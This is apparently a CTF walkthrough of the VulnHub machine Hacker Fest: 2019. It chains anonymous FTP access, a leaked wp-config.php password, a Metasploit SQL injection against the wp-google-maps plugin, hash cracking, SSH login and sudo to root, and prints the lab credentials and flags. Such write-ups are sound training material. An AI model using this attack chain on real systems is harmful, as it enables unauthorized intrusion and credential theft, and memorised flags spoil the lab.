# Hacker Fest: 2019 (VulnHub)

## Overview

**Hacker Fest: 2019** is a Medium-level VulnHub machine created by **Martin Haller**. The challenge focuses on network enumeration, anonymous FTP access, WordPress security assessment, configuration file disclosure, SQL Injection exploitation, password cracking, SSH access, and Linux privilege escalation through misconfigured sudo permissions.

The machine demonstrates how multiple vulnerabilities—including anonymous FTP access, exposed WordPress configuration files, vulnerable plugins, weak password security, and unrestricted sudo privileges—can be chained together to achieve full system compromise. :contentReference[oaicite:0]{index=0}

## Machine Information

| Attribute | Value |
|------------|---------|
| Machine Name | Hacker Fest: 2019 |
| Author | Martin Haller |
| Series | Hacker Fest |
| Platform | VulnHub |
| Release Date | 7 October 2019 |
| Difficulty | Medium |
| Target OS | Debian Linux |
| Attacker Machine | Kali Linux |
| Objective | Gain User and Root Access |

---

## Skills Demonstrated

- Network Discovery
- ARP Scanning
- Service Enumeration
- Nmap Scanning
- FTP Enumeration
- Anonymous FTP Access
- WordPress Enumeration
- WPScan
- Configuration File Analysis
- Credential Disclosure
- SQL Injection
- Metasploit Framework
- Password Hash Extraction
- John the Ripper
- Password Cracking
- SSH Enumeration
- Linux Enumeration
- Sudo Enumeration
- Linux Privilege Escalation
- Post Exploitation

---

## Tools Used

- arp-scan
- Nmap
- FTP
- WPScan
- Metasploit Framework
- John the Ripper
- SSH
- Linux Commands
- Kali Linux

---

## Attack Methodology

1. Discover target machine
2. Enumerate open ports
3. Access anonymous FTP
4. Download WordPress configuration
5. Extract database credentials
6. Enumerate WordPress using WPScan
7. Identify vulnerable plugin
8. Exploit SQL Injection using Metasploit
9. Dump WordPress password hash
10. Crack password using John
11. Login via SSH
12. Enumerate sudo privileges
13. Escalate to root
14. Capture root flag

---

# Network Discovery

Identify the target machine.

```bash
sudo arp-scan -l
```

Result

```text
192.168.1.110
```

Target successfully identified.

---

# Open Services Identified

Run an aggressive Nmap scan.

```bash
sudo nmap -A -sV -sC 192.168.1.110 -Pn --min-rate 10000
```

### Nmap Results

| Port | Service | Version |
|------|----------|----------|
| 21 | FTP | vsftpd 3.0.3 |
| 22 | SSH | OpenSSH 7.4p1 |
| 80 | HTTP | Apache 2.4.25 (WordPress 5.2.3) |
| 10000 | HTTP | Webmin MiniServ 1.890 |

### Interesting Findings

- Anonymous FTP login enabled
- WordPress website
- Webmin administrative portal
- SSH service available

---

# FTP Enumeration

Connect to FTP.

```bash
ftp 192.168.1.110
```

Login

```text
Username: anonymous
Password: anonymous
```

Interesting files

```text
wp-config.php
wp-content/
wp-admin/
```

Download configuration.

```bash
get wp-config.php
```

---

# Credential Disclosure

Inspect the configuration file.

```bash
cat wp-config.php
```

Database credentials

```text
DB_USER = wordpress
DB_PASSWORD = nvwtlRqkD0E1jBXu
```

Sensitive credentials were exposed through anonymous FTP.

---

# WordPress Enumeration

Enumerate WordPress.

```bash
wpscan --url http://192.168.1.110/
```

### Findings

- WordPress 5.2.3
- XML-RPC Enabled
- Upload directory listing enabled
- Vulnerable plugin discovered

```text
wp-google-maps
```

Plugin location

```text
/wp-content/plugins/wp-google-maps/
```

---

# SQL Injection Exploitation

Launch Metasploit.

```bash
msfconsole -q
```

Load module.

```bash
use auxiliary/admin/http/wp_google_maps_sqli
```

Configure.

```bash
set RHOSTS 192.168.1.110
run
```

Recovered credentials

```text
Username : webmaster

Hash :
$P$BsqOdiLTcye6AS1ofreys4GzRlRvSr1
```

Password hash successfully extracted.

---

# Password Cracking

Save the hash.

```bash
nano pass.txt
```

Crack using John.

```bash
john pass.txt --wordlist=/usr/share/wordlists/rockyou.txt
```

Recovered credentials

```text
Username : webmaster
Password : kittykat1
```

---

# Initial Access

Login via SSH.

```bash
ssh webmaster@192.168.1.110
```

Verify access.

```bash
whoami
```

Output

```text
webmaster
```

Retrieve user flag.

```bash
cat flag.txt
```

User Flag

```text
83cad236438ff0c0dbce55d7f0034aee18f5c39e
```

---

# Privilege Escalation

Check sudo permissions.

```bash
sudo -l
```

Output

```text
(ALL) ALL
```

The user has unrestricted sudo privileges.

Escalate.

```bash
sudo su
```

Verify.

```bash
whoami
```

Output

```text
root
```

---

# Root Flag

Navigate to root.

```bash
cd /root
```

Read flag.

```bash
cat flag.txt
```

Root Flag

```text
3dcdf93d2976321d7a8c47a6bb2d48837d330624
```

---

# Vulnerabilities Identified

### 1. Anonymous FTP Access

Allowed attackers to download sensitive application files.

### 2. WordPress Configuration Disclosure

Database credentials exposed in `wp-config.php`.

### 3. Outdated WordPress Installation

Running WordPress 5.2.3 with known vulnerabilities.

### 4. Vulnerable Plugin

`wp-google-maps` vulnerable to SQL Injection.

### 5. Weak Password

Password successfully cracked using RockYou wordlist.

### 6. Excessive Sudo Permissions

User possessed unrestricted sudo access.

---

# Attack Chain Summary

- ARP Scan
- Nmap Enumeration
- Anonymous FTP Access
- Download wp-config.php
- Extract Database Credentials
- WPScan Enumeration
- Identify Vulnerable Plugin
- SQL Injection via Metasploit
- Dump Password Hash
- Crack Password using John
- SSH Login
- Sudo Enumeration
- Root Privilege Escalation
- Capture Root Flag

---

# Security Recommendations

- Disable anonymous FTP access.
- Restrict access to configuration files.
- Update WordPress to the latest version.
- Remove vulnerable plugins.
- Disable unnecessary XML-RPC functionality.
- Restrict Webmin access.
- Enforce strong password policies.
- Apply least-privilege sudo permissions.
- Regularly patch third-party plugins.
- Perform routine vulnerability assessments.

---

# Key Learning Outcomes

- Anonymous FTP can expose critical application files.
- WordPress configuration files should never be publicly accessible.
- WPScan is effective for WordPress reconnaissance.
- SQL Injection remains one of the most dangerous web vulnerabilities.
- Password hashes can often be cracked with weak passwords.
- Metasploit simplifies exploitation of known vulnerabilities.
- Misconfigured sudo permissions frequently lead to full system compromise.
- Proper enumeration is the key to successful penetration testing.

---

# Flags

### User Flag

```text
83cad236438ff0c0dbce55d7f0034aee18f5c39e
```

### Root Flag

```text
3dcdf93d2976321d7a8c47a6bb2d48837d330624
```

---

# Conclusion

**Hacker Fest: 2019** is an excellent Medium-level VulnHub machine that demonstrates a realistic web application attack chain. It covers anonymous FTP exploitation, WordPress enumeration, configuration file disclosure, SQL Injection, password cracking, SSH access, and Linux privilege escalation through unrestricted sudo permissions. The machine reinforces the importance of secure WordPress deployments, proper file permissions, plugin management, credential protection, and least-privilege access controls.

---

**Author:** Omkar Babaji Sawant

**Repository:** VulnHub-Walkthroughs
